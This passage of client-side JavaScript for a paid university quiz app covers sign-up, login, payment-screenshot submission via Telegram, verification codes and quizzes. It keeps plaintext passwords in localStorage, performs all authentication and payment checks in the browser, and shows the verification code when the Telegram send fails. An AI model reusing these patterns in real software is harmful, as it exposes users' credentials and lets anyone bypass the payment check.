                    // Redirect to welcome page
                    setTimeout(function() {
                        showWelcomePage();
                    }, 1500);
                }
            });
            
            // University card selection
            universityCards.forEach(card => {
                card.addEventListener('click', function() {
                    const university = this.getAttribute('data-university');
                    currentUniversity = university;
                    showUniversitySubjects(university);
                });
            });
            
            // Subject card selection
            document.addEventListener('click', function(e) {
                if (e.target.classList.contains('form-button') && e.target.closest('.subject-card')) {
                    const subjectCard = e.target.closest('.subject-card');
                    const subject = subjectCard.getAttribute('data-subject');
                    currentSubject = subject;
                    
                    if (subject === 'logic') {
                        showChapterSelection();
                    } else {
                        startQuiz(subject, currentUniversity);
                    }
                }
            });
            
            // Registration form validation
            document.getElementById('registrationForm').addEventListener('submit', function(e) {
                e.preventDefault();
                let isValid = true;
                
                // Name validation
                const nameInput = document.getElementById('fullName');
                const nameError = document.getElementById('nameError');
                if (nameInput.value.trim() === '') {
                    nameError.style.display = 'block';
                    isValid = false;
                } else {
                    nameError.style.display = 'none';
                }
                
                // Email validation
                const emailInput = document.getElementById('regEmail');
                const emailError = document.getElementById('regEmailError');
                if (!validateEmail(emailInput.value)) {
                    emailError.style.display = 'block';
                    isValid = false;
                } else {
                    emailError.style.display = 'none';
                }
                
                // Telegram username validation
                const telegramInput = document.getElementById('telegramUsername');
                const telegramError = document.getElementById('telegramError');
                if (!telegramInput.value.startsWith('@') || telegramInput.value.length < 2) {
                    telegramError.style.display = 'block';
                    isValid = false;
                } else {
                    telegramError.style.display = 'none';
                }
                
                // Password validation
                const passwordInput = document.getElementById('regPassword');
                const passwordError = document.getElementById('regPasswordError');
                if (!validatePassword(passwordInput.value)) {
                    passwordError.style.display = 'block';
                    isValid = false;
                } else {
                    passwordError.style.display = 'none';
                }
                
                // Confirm password validation
                const confirmInput = document.getElementById('confirmPassword');
                const confirmError = document.getElementById('confirmPasswordError');
                if (confirmInput.value !== passwordInput.value) {
                    confirmError.style.display = 'block';
                    isValid = false;
                } else {
                    confirmError.style.display = 'none';
                }
                
                // If valid, register user and redirect to payment page
                if (isValid) {
                    // Generate a unique user ID
                    const userId = generateUserId();
                    
                    // Store user data in localStorage for login verification
                    const userData = {
                        id: userId,
                        name: nameInput.value,
                        email: emailInput.value,
                        telegram: telegramInput.value,
                        password: passwordInput.value, // In a real app, this should be hashed
                        verified: false,
                        paymentSubmitted: false,
                        profilePicture: null,
                        accountCreated: new Date().toISOString(),
                        lastLogin: new Date().toISOString(),
                        passwordChanged: new Date().toISOString(),
                        stats: {
                            totalQuizzes: 0,
                            averageScore: 0,
                            totalTime: 0,
                            quizzesCompleted: 0
                        },
                        quizHistory: []
                    };
                    
                    // Store in localStorage for login verification
                    const existingUsers = JSON.parse(localStorage.getItem('quizUsers')) || [];
                    existingUsers.push(userData);
                    localStorage.setItem('quizUsers', JSON.stringify(existingUsers));
                    
                    // Store in sessionStorage for current session
                    sessionStorage.setItem('currentUser', JSON.stringify(userData));
                    
                    // Show payment page
                    showPaymentPage(userData.name);
                    
                    // Reset form
                    this.reset();
                    
                    // Show success notification
                    showNotification('Account created successfully!', 'success');
                }
            });
            
            // Login form validation
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                let isValid = true;
                
                // Email validation
                const emailInput = document.getElementById('loginEmail');
                const emailError = document.getElementById('loginEmailError');
                if (!validateEmail(emailInput.value)) {
                    emailError.style.display = 'block';
                    isValid = false;
                } else {
                    emailError.style.display = 'none';
                }
                
                // Password validation
                const passwordInput = document.getElementById('loginPassword');
                const passwordError = document.getElementById('loginPasswordError');
                if (passwordInput.value.length === 0) {
                    passwordError.style.display = 'block';
                    isValid = false;
                } else {
                    passwordError.style.display = 'none';
                }
                
                // If valid, check credentials against stored users
                if (isValid) {
                    const existingUsers = JSON.parse(localStorage.getItem('quizUsers')) || [];
                    const user = existingUsers.find(u => u.email === emailInput.value && u.password === passwordInput.value);
                    
                    if (user) {
                        // Update last login
                        user.lastLogin = new Date().toISOString();
                        
                        // Store in sessionStorage for current session
                        sessionStorage.setItem('currentUser', JSON.stringify(user));
                        
                        // Update in localStorage
                        const userIndex = existingUsers.findIndex(u => u.id === user.id);
                        if (userIndex !== -1) {
                            existingUsers[userIndex] = user;
                            localStorage.setItem('quizUsers', JSON.stringify(existingUsers));
                        }
                        
                        // FIXED: If user is verified, go directly to dashboard, otherwise show payment
                        if (user.verified) {
                            showDashboard(user.name);
                        } else if (user.paymentSubmitted) {
                            showVerificationPage(user.name);
                        } else {
                            showPaymentPage(user.name);
                        }
                        
                        // Show success notification
                        showNotification('Login successful!', 'success');
                    } else {
                        showNotification('Invalid email or password. Please sign up first.', 'error');
                    }
                }
            });
            
            // Payment screenshot upload
            uploadArea.addEventListener('click', function() {
                paymentScreenshot.click();
            });
            
            paymentScreenshot.addEventListener('change', function(e) {
                if (e.target.files && e.target.files[0]) {
                    const file = e.target.files[0];
                    
                    // Check file size (max 5MB)
                    if (file.size > 5 * 1024 * 1024) {
                        showNotification('File size must be less than 5MB', 'error');
                        return;
                    }
                    
                    // Check file type
                    if (!file.type.match('image.*')) {
                        showNotification('Please select an image file', 'error');
                        return;
                    }
                    
                    // Preview image
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        previewImage.src = e.target.result;
                        previewContainer.style.display = 'block';
                    };
                    reader.readAsDataURL(file);
                    
                    // Enable submit button
                    submitPaymentButton.disabled = false;
                }
            });
            
            removeImageButton.addEventListener('click', function() {
                paymentScreenshot.value = '';
                previewContainer.style.display = 'none';
                submitPaymentButton.disabled = true;
            });
            
            // Submit payment proof
            submitPaymentButton.addEventListener('click', function() {
                const currentUser = JSON.parse(sessionStorage.getItem('currentUser'));
                
                // Show loading spinner
                paymentLoading.style.display = 'block';
                submitPaymentButton.disabled = true;
                
                // Get the file
                const file = paymentScreenshot.files[0];
                
                if (!file) {
                    showNotification('Please select an image file first.', 'error');
                    paymentLoading.style.display = 'none';
                    submitPaymentButton.disabled = false;
                    return;
                }
                
                // Generate verification code
                const verificationCode = generateVerificationCode();
                const expiryTime = new Date(Date.now() + 5 * 60 * 1000); // 5 minutes from now
                
                // Store verification code info
                const verificationData = {
                    code: verificationCode,
                    expiry: expiryTime.toISOString(),
                    userId: currentUser.id,
                    used: false
                };
                
                localStorage.setItem(`verification_${currentUser.id}`, JSON.stringify(verificationData));
                
                // Update user payment status FIRST
                currentUser.paymentSubmitted = true;
                currentUser.submissionTime = new Date().toISOString();
                sessionStorage.setItem('currentUser', JSON.stringify(currentUser));
                
                // Update in localStorage
                const existingUsers = JSON.parse(localStorage.getItem('quizUsers')) || [];
                const userIndex = existingUsers.findIndex(u => u.id === currentUser.id);
                if (userIndex !== -1) {
                    existingUsers[userIndex] = currentUser;
                    localStorage.setItem('quizUsers', JSON.stringify(existingUsers));
                }
                
                // Send to Telegram - FIXED VERSION
                sendPaymentToTelegram(file, currentUser, verificationCode)
                    .then(() => {
                        console.log('Payment proof sent to Telegram successfully');
                        // Show verification page regardless of Telegram success
                        paymentLoading.style.display = 'none';
                        showNotification('Payment proof submitted! Check Telegram for verification code.', 'success');
                        showVerificationPage(currentUser.name);
                    })
                    .catch((error) => {
                        console.error('Failed to send to Telegram:', error);
                        // Even if Telegram fails, we still show the verification page
                        paymentLoading.style.display = 'none';
                        showNotification('Payment submitted! Verification code: ' + verificationCode, 'success');
                        showVerificationPage(currentUser.name);
                    });
            });
            
            // Submit verification code
            submitVerificationCodeButton.addEventListener('click', function() {
                const currentUser = JSON.parse(sessionStorage.getItem('currentUser'));
                const enteredCode = verificationCodeInput.value.trim();
                
                if (!enteredCode) {
                    showNotification('Please enter the verification code.', 'error');
                    return;
                }
                
                // Get stored verification data
                const verificationData = JSON.parse(localStorage.getItem(`verification_${currentUser.id}`));
                
                if (!verificationData) {
                    showNotification('No verification code found. Please submit your payment proof again.', 'error');
                    return;
                }
                
                // Check if code has expired
                if (new Date() > new Date(verificationData.expiry)) {
                    showNotification('Verification code has expired. Please submit your payment proof again.', 'error');
                    localStorage.removeItem(`verification_${currentUser.id}`);
                    return;
                }
                
                // Check if code has been used
                if (verificationData.used) {
                    showNotification('This verification code has already been used.', 'error');
                    return;
                }
                
                // Check if code matches
                if (enteredCode !== verificationData.code) {
                    showNotification('Invalid verification code. Please check and try again.', 'error');
                    return;
                }
                
             // Code is valid - mark as used and verify user
verificationData.used = true;
localStorage.setItem(`verification_${currentUser.id}`, JSON.stringify(verificationData));

// Update user verification status
currentUser.verified = true;
sessionStorage.setItem('currentUser', JSON.stringify(currentUser));

// Update in localStorage
const existingUsers = JSON.parse(localStorage.getItem('quizUsers')) || [];
const userIndex = existingUsers.findIndex(u => u.id === currentUser.id);
if (userIndex !== -1) {
    existingUsers[userIndex] = currentUser;
    localStorage.setItem('quizUsers', JSON.stringify(existingUsers));
}

// Show the profile dropdown now that user is verified
userInfo.style.display = 'block';

showNotification('Verification successful! You now have full access.', 'success');

// Show profile, settings, leaderboard, and logout in the dropdown
showDashboard(currentUser.name);   
            });
            
            // Logout functionality
            logoutButton.addEventListener('click', function() {
                sessionStorage.removeItem('currentUser');
                showWelcomePage();
                showNotification('Logged out successfully', 'success');
            });
            
            // Quiz functionality
            // Options will be handled in the dynamically generated questions
            
            // Navigation buttons
            prevButton.addEventListener('click', function() {
                if (currentQuestion > 1) {
                    showQuestion(currentQuestion - 1);
                }
            });
            
            nextButton.addEventListener('click', function() {
                if (currentQuestion < totalQuestions) {
                    showQuestion(currentQuestion + 1);
                } else {
                    // Last question, show submit button
                    submitButton.style.display = 'block';
                    nextButton.style.display = 'none';
                }
            });
            
            // Submit quiz
            submitButton.addEventListener('click', function() {
                clearInterval(timerInterval);
                calculateScore();
            });
            
            // Retake quiz
            retakeButton.addEventListener('click', function() {
                // Reset quiz
                currentQuestion = 1;
                for (let key in userAnswers) {
                    delete userAnswers[key];
                }
                
                // Clear selections
                document.querySelectorAll('.option').forEach(option => {
                    option.classList.remove('selected');
                });
                
                // Show first question
                showQuestion(1);
                quizContainer.style.display = 'block';
                resultsContainer.style.display = 'none';
                nextButton.style.display = 'block';
                submitButton.style.display = 'none';
                
                // Reset timer
                timeRemaining = 600;
                updateTimerDisplay();
                startTimer();
            });
            
            // Review quiz
            reviewButton.addEventListener('click', function() {
                showQuizReview();
            });
            
            // Back to dashboard
            backToDashboardButton.addEventListener('click', function() {
                showDashboard(JSON.parse(sessionStorage.getItem('currentUser')).name);
            });
            
            // Functions
            function initializeChapterSelection() {
                chapterGrid.innerHTML = '';
                
                logicChapters.forEach((chapter, index) => {
                    const chapterElement = document.createElement('div');
                    chapterElement.className = 'chapter-card';
                    chapterElement.innerHTML = `
                        <div class="chapter-icon">
                            <i class="fas fa-book"></i>
                        </div>
                        <div class="chapter-title">${chapter.name}</div>
                        <div class="chapter-description">${chapter.description}</div>
                        <div class="question-count">${chapter.questionCount} Questions</div>
                        <button class="form-button" data-chapter="${index}">Start Chapter Quiz</button>
                    `;
                    chapterGrid.appendChild(chapterElement);
                });
                
                // Add event listeners to chapter buttons
                document.querySelectorAll('.chapter-card .form-button').forEach(button => {
                    button.addEventListener('click', function() {
                        const chapterIndex = parseInt(this.getAttribute('data-chapter'));
                        startLogicQuiz(chapterIndex);
                    });
                });
            }
            
function checkLoginStatus() {
    const currentUser = sessionStorage.getItem('currentUser');
    if (currentUser) {
        const user = JSON.parse(currentUser);
        navbar.style.display = 'flex';
        userName.textContent = user.name;
        
        // Show report issue button for all logged-in users
        reportIssueDropdown.style.display = 'block';
        
        // Only show profile dropdown if user is verified
        if (user.verified) {
            userInfo.style.display = 'block'; // Show the profile dropdown
        } else {
            userInfo.style.display = 'none'; // Hide the profile dropdown
        }
        
        if (user.verified) {
            showDashboard(user.name);
        } else if (user.paymentSubmitted) {
            showVerificationPage(user.name);
        } else {
            showPaymentPage(user.name);
        }
    } else {
        showWelcomePage();
    }
}
            
            function showWelcomePage() {
                welcomePanel.style.display = 'block';
                formPanel.style.display = 'none';
                paymentContainer.style.display = 'none';
                verificationContainer.style.display = 'none';
                dashboardContainer.style.display = 'none';
                quizContainer.style.display = 'none';
                resultsContainer.style.display = 'none';
                chapterSelectionContainer.style.display = 'none';
                profileContainer.style.display = 'none';
                settingsContainer.style.display = 'none';
                leaderboardContainer.style.display = 'none';
                navbar.style.display = 'none';
            }
            
            function showLoginPage() {
                welcomePanel.style.display = 'none';
                formPanel.style.display = 'block';
                paymentContainer.style.display = 'none';
                verificationContainer.style.display = 'none';
                dashboardContainer.style.display = 'none';
                quizContainer.style.display = 'none';
                resultsContainer.style.display = 'none';
                chapterSelectionContainer.style.display = 'none';
                profileContainer.style.display = 'none';
                settingsContainer.style.display = 'none';
                leaderboardContainer.style.display = 'none';
                loginForm.style.display = 'block';
                registerForm.style.display = 'none';
                navbar.style.display = 'none';
            }
            
            function showRegisterPage() {
                welcomePanel.style.display = 'none';
                formPanel.style.display = 'block';
                paymentContainer.style.display = 'none';
                verificationContainer.style.display = 'none';
                dashboardContainer.style.display = 'none';
                quizContainer.style.display = 'none';
                resultsContainer.style.display = 'none';
                chapterSelectionContainer.style.display = 'none';
                profileContainer.style.display = 'none';
                settingsContainer.style.display = 'none';
                leaderboardContainer.style.display = 'none';
                loginForm.style.display = 'none';
                registerForm.style.display = 'block';
                navbar.style.display = 'none';
            }
            
            function showPaymentPage(name) {
                welcomePanel.style.display = 'none';
                formPanel.style.display = 'none';
                paymentContainer.style.display = 'block';
                verificationContainer.style.display = 'none';
                dashboardContainer.style.display = 'none';
                quizContainer.style.display = 'none';
                resultsContainer.style.display = 'none';
                chapterSelectionContainer.style.display = 'none';
                profileContainer.style.display = 'none';
                settingsContainer.style.display = 'none';
                leaderboardContainer.style.display = 'none';
                navbar.style.display = 'flex';
                userName.textContent = name;
                
                // Show report issue button for all logged-in users (FIXED)
                reportIssueDropdown.style.display = 'block';
                
                // Reset payment form
                paymentScreenshot.value = '';
                previewContainer.style.display = 'none';
                submitPaymentButton.disabled = true;
                paymentLoading.style.display = 'none';
            }
            
            function showVerificationPage(name) {
                welcomePanel.style.display = 'none';
                formPanel.style.display = 'none';
                paymentContainer.style.display = 'none';
                verificationContainer.style.display = 'block';
                dashboardContainer.style.display = 'none';
                quizContainer.style.display = 'none';
                resultsContainer.style.display = 'none';
                chapterSelectionContainer.style.display = 'none';
                profileContainer.style.display = 'none';
                settingsContainer.style.display = 'none';
                leaderboardContainer.style.display = 'none';
                navbar.style.display = 'flex';
                userName.textContent = name;
                
                // Show report issue button for all logged-in users (FIXED)
                reportIssueDropdown.style.display = 'block';
                
                // Show verification status
                verificationStatus.style.display = 'block';
                verificationStatus.className = 'status-message status-pending';
                verificationStatus.innerHTML = '<i class="fas fa-clock"></i> Your payment is being reviewed by our team.';
                
                // Hide verification code display initially
                verificationCodeDisplay.style.display = 'none';
                
                // Clear verification code input
                verificationCodeInput.value = '';
            }
            
            function showDashboard(name) {
                welcomePanel.style.display = 'none';
                formPanel.style.display = 'none';
                paymentContainer.style.display = 'none';
                verificationContainer.style.display = 'none';
                dashboardContainer.style.display = 'block';
                quizContainer.style.display = 'none';
                resultsContainer.style.display = 'none';
                chapterSelectionContainer.style.display = 'none';
                profileContainer.style.display = 'none';
                settingsContainer.style.display = 'none';
                leaderboardContainer.style.display = 'none';
                navbar.style.display = 'flex';
                userName.textContent = name;
                
                // Show report issue button for all logged-in users (FIXED)
                reportIssueDropdown.style.display = 'block';
                
                // Show university selection by default
                showUniversitySelection();
            }
            
            function showProfilePage() {
                welcomePanel.style.display = 'none';
                formPanel.style.display = 'none';
                paymentContainer.style.display = 'none';
                verificationContainer.style.display = 'none';
                dashboardContainer.style.display = 'none';
                quizContainer.style.display = 'none';
                resultsContainer.style.display = 'none';
                chapterSelectionContainer.style.display = 'none';
                profileContainer.style.display = 'block';
                settingsContainer.style.display = 'none';
                leaderboardContainer.style.display = 'none';
                navbar.style.display = 'flex';
                
                const currentUser = JSON.parse(sessionStorage.getItem('currentUser'));
                userName.textContent = currentUser.name;
                
                // Show report issue button for all logged-in users (FIXED)
                reportIssueDropdown.style.display = 'block';
                
                // Update profile information
                profileUserName.textContent = currentUser.name;
                profileUserEmail.textContent = currentUser.email;
                profileUserTelegram.textContent = currentUser.telegram;
                profileUserStatus.textContent = currentUser.verified ? 'Status: Verified' : currentUser.paymentSubmitted ? 'Status: Payment Submitted' : 'Status: Not verified';
                
                // Update profile picture
                if (currentUser.profilePicture) {
                    profilePicture.src = currentUser.profilePicture;
                    profilePicture.style.display = 'block';
                    profilePicturePlaceholder.style.display = 'none';
                } else {
                    profilePicture.style.display = 'none';
                    profilePicturePlaceholder.style.display = 'block';
                }
                
                // Update stats
                document.getElementById('totalQuizzes').textContent = currentUser.stats.totalQuizzes || 0;
                document.getElementById('averageScore').textContent = currentUser.stats.averageScore ? `${currentUser.stats.averageScore}%` : '0%';
                document.getElementById('totalTime').textContent = currentUser.stats.totalTime ? `${currentUser.stats.totalTime} min` : '0 min';
                document.getElementById('quizzesCompleted').textContent = currentUser.stats.quizzesCompleted || 0;
                
                // Update account details
                accountCreated.textContent = formatDate(currentUser.accountCreated);
                lastLogin.textContent = formatDate(currentUser.lastLogin);
                passwordChanged.textContent = formatDate(currentUser.passwordChanged);
                paymentStatus.textContent = currentUser.paymentSubmitted ? 'Submitted' : 'Not Submitted';
                verificationStatusProfile.textContent = currentUser.verified ? 'Verified' : 'Not Verified';
            }
            
            function showSettingsPage() {
                welcomePanel.style.display = 'none';
                formPanel.style.display = 'none';
                paymentContainer.style.display = 'none';
                verificationContainer.style.display = 'none';
                dashboardContainer.style.display = 'none';
                quizContainer.style.display = 'none';
                resultsContainer.style.display = 'none';
                chapterSelectionContainer.style.display = 'none';
                profileContainer.style.display = 'none';
                settingsContainer.style.display = 'block';
                leaderboardContainer.style.display = 'none';
                navbar.style.display = 'flex';
                
                const currentUser = JSON.parse(sessionStorage.getItem('currentUser'));
                userName.textContent = currentUser.name;
                
                // Show report issue button for all logged-in users (FIXED)
                reportIssueDropdown.style.display = 'block';
                
                // Reset change password form visibility
                changePasswordForm.style.display = 'none';
                showChangePasswordBtn.style.display = 'block';
            }
            
            function showLeaderboard() {
                welcomePanel.style.display = 'none';
                formPanel.style.display = 'none';
                paymentContainer.style.display = 'none';
                verificationContainer.style.display = 'none';
                dashboardContainer.style.display = 'none';
                quizContainer.style.display = 'none';
                resultsContainer.style.display = 'none';
                chapterSelectionContainer.style.display = 'none';
                profileContainer.style.display = 'none';
                settingsContainer.style.display = 'none';
                leaderboardContainer.style.display = 'block';
                navbar.style.display = 'flex';
                
                const currentUser = JSON.parse(sessionStorage.getItem('currentUser'));
                userName.textContent = currentUser.name;
                
                // Show report issue button for all logged-in users (FIXED)
                reportIssueDropdown.style.display = 'block';
                
                // Generate leaderboard
                generateLeaderboard();
            }
            
            function generateLeaderboard() {
                const users = JSON.parse(localStorage.getItem('quizUsers')) || [];
                
                // Filter users with quiz history and calculate their scores
                const leaderboardData = users
                    .filter(user => user.quizHistory && user.quizHistory.length > 0)
                    .map(user => {
                        const totalScore = user.quizHistory.reduce((sum, quiz) => sum + quiz.score, 0);
                        const avgScore = Math.round(totalScore / user.quizHistory.length);
                        const totalTime = user.quizHistory.reduce((sum, quiz) => sum + quiz.time, 0);
                        
                        return {
                            name: user.name,
                            university: 'Haramaya University', // Default for now
                            score: avgScore,
                            time: Math.round(totalTime / user.quizHistory.length)
                        };
                    })
                    .sort((a, b) => b.score - a.score)
                    .slice(0, 10); // Top 10
                
                leaderboardBody.innerHTML = '';
                
                if (leaderboardData.length === 0) {
                    leaderboardBody.innerHTML = '<tr><td colspan="5" style="text-align: center;">No quiz data available yet</td></tr>';
                    return;
                }
                
                leaderboardData.forEach((user, index) => {
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${index + 1}</td>
                        <td>${user.name}</td>
                        <td>${user.university}</td>
                        <td>${user.score}%</td>
                        <td>${user.time}s</td>
                    `;
                    leaderboardBody.appendChild(row);
                });
            }
            
            function showUniversitySelection() {
                universitySelectionView.style.display = 'block';
                subjectsView.style.display = 'none';
            }
            
            function showUniversitySubjects(university) {
                universitySelectionView.style.display = 'none';
                subjectsView.style.display = 'block';
                
                // Set university title
                const universityNames = {
                    'haramaya': 'Haramaya University',
                    'addis-ababa': 'Addis Ababa University',
                    'mekelle': 'Mekelle University',
                    'gondar': 'University of Gondar',
                    'bahir-dar': 'Bahir Dar University',
                    'jimma': 'Jimma University',
                    'hawassa': 'Hawassa University',
                    'adama': 'Adama Science and Technology University',
                    'jigjiga': 'Jigjiga University',
                    'arba-minch': 'Arba Minch University'
                };
                
                currentUniversityTitle.textContent = universityNames[university] + ' Subjects';
                currentUniversitySubtitle.textContent = 'Select a subject to start the quiz';
                
                // Hide all content first
                haramayaContent.style.display = 'none';
                comingSoonAddis.style.display = 'none';
                comingSoonMekelle.style.display = 'none';
                comingSoonGondar.style.display = 'none';
                comingSoonBahirDar.style.display = 'none';
                comingSoonJimma.style.display = 'none';
                comingSoonHawassa.style.display = 'none';
                comingSoonAdama.style.display = 'none';
                comingSoonJigjiga.style.display = 'none';
                comingSoonArbaMinch.style.display = 'none';
                
                // Show appropriate content based on university
                if (university === 'haramaya') {
                    haramayaContent.style.display = 'block';
                    naturalScienceSubjects.style.display = 'grid';
                } else if (university === 'addis-ababa') {
                    comingSoonAddis.style.display = 'block';
                } else if (university === 'mekelle') {
                    comingSoonMekelle.style.display = 'block';
                } else if (university === 'gondar') {
                    comingSoonGondar.style.display = 'block';
                } else if (university === 'bahir-dar') {
                    comingSoonBahirDar.style.display = 'block';
                } else if (university === 'jimma') {
                    comingSoonJimma.style.display = 'block';
                } else if (university === 'hawassa') {
                    comingSoonHawassa.style.display = 'block';
                } else if (university === 'adama') {
                    comingSoonAdama.style.display = 'block';
                } else if (university === 'jigjiga') {
                    comingSoonJigjiga.style.display = 'block';
                } else if (university === 'arba-minch') {
                    comingSoonArbaMinch.style.display = 'block';
                }
            }
            
            function showChapterSelection() {
                dashboardContainer.style.display = 'none';
                chapterSelectionContainer.style.display = 'block';
            }
            
            function startLogicQuiz(chapterIndex) {
                currentChapterIndex = chapterIndex;
                const chapter = quizDatabase.haramaya.natural.logic.chapters[chapterIndex];
                
                // Set quiz titles
                quizSubjectTitle.textContent = `Logic: ${chapter.name}`;
                quizUniversityTitle.textContent = 'Haramaya University';
                
                // Get questions from the selected chapter
                currentQuizQuestions = chapter.questions;
                totalQuestions = currentQuizQuestions.length;
                
                // Generate question containers
                generateQuestions();
                
                // Show quiz container
                welcomePanel.style.display = 'none';
                formPanel.style.display = 'none';
                paymentContainer.style.display = 'none';
                verificationContainer.style.display = 'none';
                dashboardContainer.style.display = 'none';
                chapterSelectionContainer.style.display = 'none';
                quizContainer.style.display = 'block';
                resultsContainer.style.display = 'none';
                leaderboardContainer.style.display = 'none';
                
                // Reset and start quiz
                currentQuestion = 1;
                showQuestion(1);
                startTimer();
            }
            
            function startQuiz(subject, university) {
                // Set quiz titles based on subject and university
                const subjectTitles = {
                    'logic': 'Logic and Critical Thinking',
                    'psychology': 'Psychology',
                    'english': 'English',
                    'mathematics': 'Mathematics',
                    'geography': 'Geography',
                    'physics': 'Physics'
                };
                
                const universityTitles = {
                    'haramaya': 'Haramaya University',
                    'addis-ababa': 'Addis Ababa University',
                    'mekelle': 'Mekelle University',
                    'gondar': 'University of Gondar',
                    'bahir-dar': 'Bahir Dar University',
                    'jimma': 'Jimma University',
                    'hawassa': 'Hawassa University',
                    'adama': 'Adama Science and Technology University',
                    'jigjiga': 'Jigjiga University',
                    'arba-minch': 'Arba Minch University'
                };
                
                quizSubjectTitle.textContent = subjectTitles[subject] || subject;
                quizUniversityTitle.textContent = universityTitles[university] || university;
                
                // Get questions from database
                if (university === 'haramaya') {
                    currentQuizQuestions = quizDatabase.haramaya.natural[subject];
                } else {
                    // For other universities, use default questions for now
                    currentQuizQuestions = quizDatabase.haramaya.natural[subject] || quizDatabase.haramaya.natural.logic.chapters[0].questions;
                }
                
                totalQuestions = currentQuizQuestions.length;
                
                // Generate question containers
                generateQuestions();
                
                // Show quiz container
                welcomePanel.style.display = 'none';
                formPanel.style.display = 'none';
                paymentContainer.style.display = 'none';
                verificationContainer.style.display = 'none';
                dashboardContainer.style.display = 'none';
                chapterSelectionContainer.style.display = 'none';
                quizContainer.style.display = 'block';
                resultsContainer.style.display = 'none';
                leaderboardContainer.style.display = 'none';
                
                // Reset and start quiz
                currentQuestion = 1;
                showQuestion(1);
                startTimer();
            }
            
            function generateQuestions() {
                questionsContainer.innerHTML = '';
                
                for (let i = 0; i < totalQuestions; i++) {
                    const questionContainer = document.createElement('div');
                    questionContainer.className = 'question-container';
                    questionContainer.id = `question-${i+1}`;
                    
                    const question = currentQuizQuestions[i];
                    questionContainer.innerHTML = `
                        <h3>${question.question}</h3>
                        <div class="options-container">
                            ${question.options.map((option, index) => `
                                <div class="option" data-index="${index}">${option}</div>
                            `).join('')}
                        </div>
                        <div class="explanation" style="display: none;"></div>
                    `;
                    
                    questionsContainer.appendChild(questionContainer);
                    
                    // Add event listeners to options
                    const options = questionContainer.querySelectorAll('.option');
                    options.forEach(option => {
                        option.addEventListener('click', function() {
                            // Remove selected class from all options in this question
                            options.forEach(opt => opt.classList.remove('selected'));
                            
                            // Add selected class to clicked option
                            this.classList.add('selected');
                            
                            // Store user's answer
                            userAnswers[i+1] = parseInt(this.getAttribute('data-index'));
                        });
                    });
                }
            }
            
            function showQuestion(questionNumber) {
                // Hide all questions
                document.querySelectorAll('.question-container').forEach(q => {
                    q.style.display = 'none';
                });
                
                // Show the selected question
                document.getElementById(`question-${questionNumber}`).style.display = 'block';
                
                // Update progress
                currentQuestion = questionNumber;
                progressText.textContent = `Question ${questionNumber} of ${totalQuestions}`;
                progressFill.style.width = `${(questionNumber / totalQuestions) * 100}%`;
                
                // Update navigation buttons
                prevButton.disabled = (questionNumber === 1);
                nextButton.disabled = (questionNumber === totalQuestions);
                
                // If we're on the last question, show submit button instead of next
                if (questionNumber === totalQuestions) {
                    nextButton.style.display = 'none';
                    submitButton.style.display = 'block';
                } else {
                    nextButton.style.display = 'block';
                    submitButton.style.display = 'none';
                }
                
                // Restore user's answer if available
                if (userAnswers[questionNumber] !== undefined) {
                    const options = document.querySelectorAll(`#question-${questionNumber} .option`);
                    options[userAnswers[questionNumber]].classList.add('selected');
                }
            }
            
            function startTimer() {
                clearInterval(timerInterval);
                timeRemaining = 600; // 10 minutes
                updateTimerDisplay();
                
                timerInterval = setInterval(function() {
                    timeRemaining--;
                    updateTimerDisplay();
                    
                    if (timeRemaining <= 0) {
                        clearInterval(timerInterval);
                        calculateScore();
                        showNotification('Time is up! Quiz submitted automatically.', 'error');
                    }
                }, 1000);
            }
            
            function updateTimerDisplay() {
                const minutes = Math.floor(timeRemaining / 60);
                const seconds = timeRemaining % 60;
                timerDisplay.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
                
                // Change color when time is running low
                if (timeRemaining <= 60) {
                    timerDisplay.classList.add('timer-warning');
                } else {
                    timerDisplay.classList.remove('timer-warning');
                }
            }
            
            function calculateScore() {
                let correctAnswers = 0;
                quizResults = [];
                
                for (let i = 1; i <= totalQuestions; i++) {
                    const userAnswer = userAnswers[i];
                    const correctAnswer = currentQuizQuestions[i-1].correct;
                    const isCorrect = userAnswer === correctAnswer;
                    
                    if (isCorrect) {
                        correctAnswers++;
                    }
                    
                    quizResults.push({
                        question: currentQuizQuestions[i-1].question,
                        userAnswer: userAnswer !== undefined ? currentQuizQuestions[i-1].options[userAnswer] : 'Not answered',
                        correctAnswer: currentQuizQuestions[i-1].options[correctAnswer],
                        isCorrect: isCorrect,
                        explanation: currentQuizQuestions[i-1].explanation
                    });
                }
                
                const scorePercentage = Math.round((correctAnswers / totalQuestions) * 100);
                
                // Update user stats
                const currentUser = JSON.parse(sessionStorage.getItem('currentUser'));
                currentUser.stats.totalQuizzes = (currentUser.stats.totalQuizzes || 0) + 1;
                currentUser.stats.quizzesCompleted = (currentUser.stats.quizzesCompleted || 0) + 1;
                
                // Calculate new average score
                const totalScore = (currentUser.stats.averageScore || 0) * (currentUser.stats.quizzesCompleted - 1) + scorePercentage;
                currentUser.stats.averageScore = Math.round(totalScore / currentUser.stats.quizzesCompleted);
                
                // Add total time spent
                const timeSpent = 600 - timeRemaining;
                currentUser.stats.totalTime = (currentUser.stats.totalTime || 0) + Math.round(timeSpent / 60);
                
                // Add quiz to history
                if (!currentUser.quizHistory) {
                    currentUser.quizHistory = [];
                }
                
                currentUser.quizHistory.push({
                    subject: currentSubject,
                    chapter: currentSubject === 'logic' ? logicChapters[currentChapterIndex].name : null,
                    score: scorePercentage,
                    time: timeSpent,
                    date: new Date().toISOString()
                });
                
                // Update session and local storage
                sessionStorage.setItem('currentUser', JSON.stringify(currentUser));
                const existingUsers = JSON.parse(localStorage.getItem('quizUsers')) || [];
                const userIndex = existingUsers.findIndex(u => u.id === currentUser.id);
                if (userIndex !== -1) {
                    existingUsers[userIndex] = currentUser;
                    localStorage.setItem('quizUsers', JSON.stringify(existingUsers));
                }
                
                // Show results
                showResults(correctAnswers, scorePercentage);
            }
            
            function showResults(correctAnswers, scorePercentage) {
                quizContainer.style.display = 'none';
                resultsContainer.style.display = 'block';
                
                // Update score
                document.getElementById('finalScore').textContent = `${correctAnswers}/${totalQuestions}`;
                
                // Update score text
                let scoreText = '';
                if (scorePercentage >= 90) {
                    scoreText = 'Excellent work! You have mastered this subject.';
                } else if (scorePercentage >= 70) {
                    scoreText = 'Good job! You have a solid understanding.';
                } else if (scorePercentage >= 50) {
                    scoreText = 'Not bad! Keep practicing to improve.';
                } else {
                    scoreText = 'You can do better! Try reviewing the material and retaking the quiz.';
                }
